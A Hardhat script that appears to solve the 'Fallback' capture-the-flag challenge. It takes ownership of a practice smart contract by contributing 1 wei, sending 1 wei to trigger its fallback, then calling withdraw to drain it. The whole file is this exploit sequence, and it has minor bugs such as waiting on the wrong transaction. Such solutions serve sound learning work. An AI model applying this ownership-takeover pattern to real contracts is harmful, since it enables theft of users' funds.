const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const Fallback = await ethers.getContractFactory("Fallback");

    let contract = Fallback.attach(instance_address);

    // Call the contribute methods
    console.log('Calling the contribute method');
    tx = await contract.contribute({'value': 1});

    console.log('Waiting for 10 confirmations');
    await tx.wait(10);

    // Send 1 wei to the contract
    console.log('Sending 1 wei to the contract');
    tx = await account.sendTransaction({
      to:    instance_address,
      value: 1    // 1 wei
    });

    console.log('Waiting for 10 confirmations');
    await tx.wait(10);

    // Call the withdraw method on the contract
    console.log('Calling the withdraw method');
    await contract.withdraw();

    console.log('Waiting for 10 confirmations');
    await tx.wait(10);

    console.log('Success!');

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0xCbff94eF2Bcc18DCDF17F2D9EaC8a4375D097635';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
